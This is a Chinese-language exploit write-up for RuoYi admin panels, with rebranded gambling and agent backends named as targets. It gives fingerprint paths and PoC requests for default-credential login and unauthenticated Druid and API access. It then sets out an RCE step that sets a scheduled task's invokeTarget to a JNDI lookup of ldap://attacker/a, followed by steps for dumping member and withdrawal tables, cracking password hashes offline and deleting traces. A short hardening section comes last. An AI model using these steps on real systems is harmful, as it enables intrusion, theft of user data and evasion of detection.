---
title: 若依（RuoYi）系后台默认口令 / Druid / 定时任务 RCE
cve: 无（部署缺陷 + 实现缺陷）
severity: critical
cvss: 9.0
product: 若依 RuoYi（及二开的包网/代理后台）
versions: 4.x / 3.x / 二开变体
ports: 80, 443, 8080, 9090
keywords: ruoyi, 若依, druid, admin123, quartz, 定时任务, prod-api
verified: false
sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
---

## 指纹

```
前端: 登录页标题/RuoYi 版权、"若依管理系统"、/index 里的 /prod-api/ 前缀
路径: /prod-api/  /dev-api/  /prod-api/system/user/list  /druid/index.html
      /swagger-ui.html  /v2/api-docs  /prod-api/v2/api-docs
默认: admin/admin123
```

二开站点常把标题换掉，但 `/prod-api/`、`/druid/`、`/tool/gen` 这些路径习惯改不掉。

## 前置条件

- 后台或 API 外网可达（包网站常见 `admin.xxx.com`、`agent.xxx.com`）。

## PoC

```http
### 1) 默认口令
POST /prod-api/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"admin123","code":"","uuid":""}

### 2) Druid 监控未授权（拿到 SQL、URI、session）
GET /druid/index.html HTTP/1.1
GET /druid/sql.html HTTP/1.1
GET /druid/websession.html HTTP/1.1

### 3) 未授权接口（部分版本 /prod-api 未拦）
GET /prod-api/system/user/list?pageNum=1&pageSize=10 HTTP/1.1
```

## 利用步骤

1. 指纹确认后先试默认口令与 `admin/123456`、`admin/admin888`；这类站换皮不换账号。
2. Druid 页里能看到 `系统登录账号`、慢 SQL、URI 统计 → 直接找到未鉴权接口与数据源（`spring.datasource.url/username/password` 常在 `druid/datasource.html`）。
3. 后台进得去 → `系统监控 → 定时任务`：把 `invokeTarget` 改成
   `javax.naming.InitialContext.lookup('ldap://attacker/a')`（JDK 低版本）或 `com.ruoyi...` 反射链，`cron` 设 1 分钟，触发即 RCE。
4. 备选：`代码生成 → 导入表 → 生成代码` 可写文件到模板目录（部分版本限制），或 `工具 → swagger` 里找未授权写接口。
5. 拿 DB 后 dump 会员/订单/代理/提现审核表；拿 `sys_user` 里的 `password`（bcrypt）做离线爆破。
6. 清理：删定时任务、删生成的菜单/表记录、删上传文件。

## 修复与缓解（加固）

- 改默认口令并强制复杂度；删除示例账号与演示菜单。
- `druid` 监控加鉴权或直接下线（`spring.datasource.druid.stat-view-servlet.enabled=false`）。
- `/prod-api` 只对内网/管理网；关闭 swagger；生产关 `tool/gen`。
- 定时任务 `invokeTarget` 白名单（只允许已注册的 bean 方法），并对 `cron` 变更告警。

## 参考

- 若依官方安全公告与 issue；Druid StatViewServlet 文档。
